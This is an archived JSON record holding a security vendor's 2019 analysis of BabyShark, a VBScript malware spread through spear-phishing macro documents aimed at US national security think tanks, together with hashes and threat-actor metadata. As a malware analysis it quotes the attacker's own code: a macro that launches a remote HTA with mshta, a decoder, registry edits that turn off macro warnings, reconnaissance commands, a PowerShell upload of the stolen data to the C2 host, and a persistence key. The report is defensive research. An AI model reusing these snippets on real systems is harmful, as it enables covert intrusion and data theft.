{
    "id": "2f1da54a-36b8-431b-a365-6e23e06f530a",
    "created_at": "2023-01-12T15:00:00.061331Z",
    "updated_at": "2025-03-27T02:07:50.883761Z",
    "deleted_at": null,
    "sha1_hash": "89081a68d1fd89c9dbbd4269b3c9b2e4d586c4db",
    "title": "2019-02-22 - New BabyShark Malware Targets US National Security Think Tanks",
    "authors": "",
    "file_creation_date": "2022-05-25T14:24:05Z",
    "file_modification_date": "2022-05-25T14:24:05Z",
    "file_size": 1049047,
    "plain_text": "# New BabyShark Malware Targets U.S. National Security Think Tanks\n\n**[unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks](https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/)**\n\nFebruary 22, 2019\n\nBy [Unit 42](https://unit42.paloaltonetworks.com/author/unit42/)\n\nFebruary 22, 2019 at 6:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [Babyshark,](https://unit42.paloaltonetworks.com/tag/babyshark/) [KimJongRAT,](https://unit42.paloaltonetworks.com/tag/kimjongrat/) [STOLEN PENCIL](https://unit42.paloaltonetworks.com/tag/stolen-pencil/)\n\nIn February 2019, Palo Alto Networks Unit 42 researchers identified spear phishing emails sent in November\n2018 containing new malware that shares infrastructure with playbooks associated with North Korean\ncampaigns. The spear phishing emails were written to appear as though they were sent from a nuclear\nsecurity expert who currently works as a consultant for in the U.S. The emails were sent using a public email\naddress with the expert’s name and had a subject referencing North Korea’s nuclear issues. The emails had a\nmalicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB)\nscript-based malware family which we are dubbing “BabyShark”.\n\nBabyShark is a relatively new malware. The earliest sample we found from open source repositories and our\n[internal data sets was seen in November 2018. The malware is launched by executing the first stage HTA](https://en.wikipedia.org/wiki/HTML_Application)\nfrom a remote location, thus it can be delivered via different file types including PE files as well as malicious\ndocuments. It exfiltrates system information to C2 server, maintains persistence on the system, and waits for\nfurther instruction from the operator. Figure 1, below, shows the flow of execution.\n\n\n-----\n\n_Figure 1 BabyShark execution flow_\n\n[This post is also available in: 日本語 (Japanese)](https://unit42.paloaltonetworks.jp/new-babyshark-malware-targets-u-s-national-security-think-tanks/)\n\nUnit 42 was able to determine the phishing emails targeted at least:\n\nA university in the U.S. which was to hold a conference about North Korea denuclearization issue at the\ntime\nA research institute based in the U.S. which serves as a think tank for national security issues, and\nwhere the previously referenced nuclear expert currently works.\n\nExpanding our search to public repository samples, we identified additional malicious document samples\ndelivering BabyShark. The original file names and decoy contents of these samples suggested that the threat\nactor might have interests in gathering intelligence related to not only North Korea, but possibly wider in the\nNortheast Asia region.\n\nDuring the investigation, we were able to find links to other suspected North Korean activities in the past;\n[KimJongRAT and STOLEN PENCIL.](https://malware.lu/assets/files/articles/RAP003_KimJongRAT-Stealer_Analysis.1.0.pdf)\n\n## Malicious Documents\n\nBabyShark is a relatively new malware. The first sample we observed is from November 2018. The decoy\ncontents of all malicious documents delivering BabyShark were written in English and were related to\nNortheast Asia’s regional security issues.\n\n\n-----\n\n_Figure 2 Timeline of BabyShark malicious documents and filename / decoys_\n\nWhile some decoys used content which is publicly available information on the internet, some used content\nwhich appears to not be public. Inspecting the metadata of the documents with this non-public content, we\nsuspect that the threat actor likely compromised someone with access to private documents at a U.S. national\nsecurity think tank.\n\n_Figure 3 Decoy content copied from the internet_\n\n\n-----\n\n_Figure 4 Decoy content not publicly available on the internet (intentionally obfuscated)_\n\nThe malicious documents contain a simple macro which would load the BabyShark’s first stage HTA at a\nremote location.\n\nSub AutoOpen()\n\nShell (\"mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta\")\n\nEnd Sub\n\n## BabyShark Malware Analysis\n\nAnalyzed sample details:\n\n**SHA256** 9d842c9c269345cd3b2a9ce7d338a03ffbf3765661f1ee6d5e178f40d409c3f8\n\n**Create Date** 2018:12:31 02:40:00Z\n\n**Modify Date** 2019:01:10 06:54:00Z\n\n\n-----\n\n**Filename** Oct_Bld_full_view.docm\n\n_Table 1 Analyzed sample details_\n\nThe sample is a Word document which contains a malicious macro loading BabyShark by executing the first\nstage HTA file at a remote location below:\n\nhttps://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta\n\nAfter successfully loading the first stage HTA, it sends out an HTTP GET request to another location on the\nsame C2 server, then decodes the response content with the following decoder function.\n\nFunction Co00(c)\n\nL=Len(c)\n\ns=\"\"\n\nFor jx=0 To d-1\n\nFor ix=0 To Int(L/d)-1\n\ns=s&Mid(c,ix*d+jx+1,1)\n\nNext\n\nNext\n\ns=s&Right(c,L-Int(L/d)*d)\n\nCo00=s\n\nEnd Function\n\nThe decoded BabyShark VB script first enables all future macros for Microsoft Word and Excel by adding the\nfollowing registry keys:\n\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings, value:1\n\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings, value:1\n\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings, value:1\n\nHKCU\\Software\\Microsoft\\Office\\14.0\\WORD\\Security\\VBAWarnings, value:1\n\nHKCU\\Software\\Microsoft\\Office\\15.0\\WORD\\Security\\VBAWarnings, value:1\n\nHKCU\\Software\\Microsoft\\Office\\16.0\\WORD\\Security\\VBAWarnings, value:1\n\nIt then issues a sequence of Windows commands and saves the results in %AppData%\\Microsoft\\ttmp.log.\n\nwhoami\n\nhostname\n\nipconfig /all\n\n\n-----\n\nnet user\n\ndir \"%programfiles%\"\n\ndir \"%programfiles% (x86)\"\n\ndir \"%programdata%\\Microsoft\\Windows\\Start Menu\"\n\ndir \"%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\"\n\ndir \"%appdata%\\Microsoft\\Windows\\Recent\"\n\ntasklist\n\nver\n\nset\n\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\n\nThe collected data is encoded using Windows certutil.exe tool, then uploaded to the C2 via a HTTP POST\nrequest.\n\nretu=wShell.run(\"certutil -f -encode \"\"\"&ttmp&\"\"\" \"\"\"&ttmp1&\"\"\"\",0,true)\n\nretu=wShell.run(\"powershell.exe (New-Object\nSystem.Net.WebClient).UploadFile('https://tdalpacafarm[.]com/files/kr/contents/upload.php','\"&ttmp1&\"');del\n\"\"\"&ttmp1&\"\"\";del \"\"\"&ttmp&\"\"\"\",0,true)\n\nBabyShark adds the following registry key value to maintain persistence and waits for further commands\nfrom the operator. Unfortunately, we were not able to collect additional commands issued by the operator.\n\nHKCU\\Software\\Microsoft\\Command Processor\\AutoRun, value: “powershell.exe mshta\nhttps://tdalpacafarm[.]com/files/kr/contents/Usoro.hta\"\n\nThis registry key executes the string value when cmd.exe is launched. BabyShark ensures cmd.exe is\nlaunched by registering the following scripts as scheduled tasks:\n\n[%AppData%\\Microsoft\\Axz\\zvftz.vbs]\n\nSet wShell=CreateObject(\"WScript.Shell\"):retu=wShell.run(\"cmd.exe /c taskkill /im cmd.exe\",0,true)\n\n[%AppData%\\Adobe\\Gqe\\urjlt.js]\n\nwShell=new ActiveXObject(\"WScript.Shell\");retu=wShell.run(\"cmd.exe /c taskkill /im cmd.exe\"\",0,true);\n\n## Links to Other Activity\n\nWe noticed BabyShark having connections with other suspected North Korean activities in the past;\nKimJongRAT and STOLEN PENCIL.\n\n### KimJongRAT connection:\n\nBabyShark and KimJongRAT use the same file path for storing collected system information:\n%AppData%/Microsoft/ttmp.log.\n\n\n-----\n\nKimJongRAT had similar interests in targeting national security related targets. The malware was\ndelivered with the following decoys:\n\n**Decoy Filename** **Dropper SHA256**\n\n\nKendall-AFA 2014\nConference17Sept14.pdf\n\nU.S. Nuclear\nDeterrence.pdf\n\n제30차한미안보 안내장\nENKO.fdp.etadpU.scr\n(translates to 30th\nKorea-U.S. National\nSecurity Invitation\nUpdate)\n\nConference\nInformation_2010\nIFANS Conference on\nGlobal Affairs (1001).pdf\n\n\nc4547c917d8a9e027191d99239843d511328f9ec6278009d83b3b2b8349011a0\n\n1ad53f5ff0a782fec3bce952035bc856dd940899662f9326e01cb24af4de413d\n\nb3e85c569e89b6d409841463acb311839356c950d9eb64b9687ddc6a71d1b01b\n\n0c8f17b2130addebcb2ca75bd7a982e37ddcc49d49e79fe60e3fda767f2ec972\n\n\n_Table 2 Decoy filename used when delivering KimJongRAT_\n\nThe threat actor behind the BabyShark malware frequently tested its samples for anti-virus detection\nwhen developing the malware. The testing samples included a freshly compiled KimJongRAT.\n\n\n**SHA256** **Size** **Compile**\n**Date**\n\n\n52b898adaaf2da71c5ad6b3dfd3ecf64623bedf505eae51f9769918dbfb6b731 685,568\nbytes\n\n_Table 3 Freshly compiled testing KimJongRAT sample_\n\n### STOLEN PENCIL connection:\n\n\n201901-04\n05:44:31\n\n\n**AV Test**\n**Site**\n**Upload**\n**Date**\n\n201901-04\n08:15:41\n\n\nA freshly compiled testing version of a PE type BabyShark loader was uploaded to a public sample\nrepository. The sample was signed with the stolen codesigning certificate used in the STOLEN PENCIL\ncampaign. We did not notice any other malware being signed with this certificate.\n\n\n**SHA256** **Size** **Compile**\n**Date**\n\n\n6f76a8e16908ba2d576cf0e8cdb70114dcb70e0f7223be10aab3a728dc65c41c 32,912\nbytes\n\n_Table 4 Signed testing version of PE type BabyShark loader sample_\n\n\n201812-21\n00:34:35\n\n\n**AV Test**\n**Site**\n**Upload**\n**Date**\n\n201812-21\n08:30:28\n\n\n-----\n\n_Figure 5 Codesign details_\n\n## Conclusion\n\nBabyShark is being used in a limited spear phishing campaign which started in November 2018 and is still\nongoing. The threat actor behind it has a clear focus on gathering intelligence related to Northeast Asia’s\nnational security issues. Well-crafted spear phishing emails and decoys suggest that the threat actor is well\naware of the targets, and also closely monitors related community events to gather the latest intelligence.\nWhile not conclusive, we suspect that the threat actor behind BabyShark is likely connected to the same actor\nwho used the KimJongRAT malware family, and at least shares resources with the threat actor responsible\nfor the STOLEN PENCIL campaign. We also noticed testing indicating the attackers are working on a PE\nloader for BabyShark. The threat actor may use different methods to deliver BabyShark in the future\ncampaigns.\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\nWildFire and Traps detect all the malware supported in this report as malicious.\nC2 domains used by the attackers are blocked via Threat Prevention.\n\nAutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the\nfollowing tag:\n\n[BabyShark](http://autofocus.paloaltonetworks.com/#/tag/Unit42.BabyShark)\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this\nreport with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy\nprotections to their customers and to systematically disrupt malicious cyber actors. For more information on\n\n\n-----\n\nthe Cyber Threat Alliance, visit cyberthreatalliance.org.\n\n### Indicators of Compromise\n\n**Malicious Documents:**\n\n7b77112ac7cbb7193bcd891ce48ab2acff35e4f8d523980dff834cb42eaffafa\n\n9d842c9c269345cd3b2a9ce7d338a03ffbf3765661f1ee6d5e178f40d409c3f8\n\n2b6dc1a826a4d5d5de5a30b458e6ed995a4cfb9cad8114d1197541a86905d60e\n\n66439f0e377bbe8cda3e516e801a86c64688e7c3dde0287b1bfb298a5bdbc2a2\n\n8ef4bc09a9534910617834457114b9217cac9cb33ae22b37889040cde4cabea6\n\n331d17dbe4ee61d8f2c91d7e4af17fb38102003663872223efaa4a15099554d7\n\n1334c087390fb946c894c1863dfc9f0a659f594a3d6307fb48f24c30a23e0fc0\n\ndc425e93e83fe02da9c76b56f6fd286eace282eaad6d8d497e17b3ec4059020a\n\n94a09aff59c0c27d1049509032d5ba05e9285fd522eb20b033b8188e0fee4ff0\n\n### PE version loader, signed with stolen certificate:\n\n6f76a8e16908ba2d576cf0e8cdb70114dcb70e0f7223be10aab3a728dc65c41c\n\n**Get updates from Palo Alto Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-02-22 - New BabyShark Malware Targets US National Security Think Tanks.pdf"
    ],
    "report_names": [
        "2019-02-22 - New BabyShark Malware Targets US National Security Think Tanks.pdf"
    ],
    "threat_actors": [
        {
            "id": "a02bb810-5dd2-46c1-a609-b44d984d96d0",
            "created_at": "2022-10-25T15:50:23.505735Z",
            "updated_at": "2025-03-27T02:00:55.487109Z",
            "deleted_at": null,
            "main_name": "Stolen Pencil",
            "aliases": [
                "Stolen Pencil"
            ],
            "source_name": "MITRE:Stolen Pencil",
            "tools": [
                "Mimikatz",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535600,
    "ts_updated_at": 1743041270,
    "ts_creation_date": 1653488645,
    "ts_modification_date": 1653488645,
    "files": {
        "pdf": "https://archive.orkl.eu/89081a68d1fd89c9dbbd4269b3c9b2e4d586c4db.pdf",
        "text": "https://archive.orkl.eu/89081a68d1fd89c9dbbd4269b3c9b2e4d586c4db.txt",
        "img": "https://archive.orkl.eu/89081a68d1fd89c9dbbd4269b3c9b2e4d586c4db.jpg"
    }
}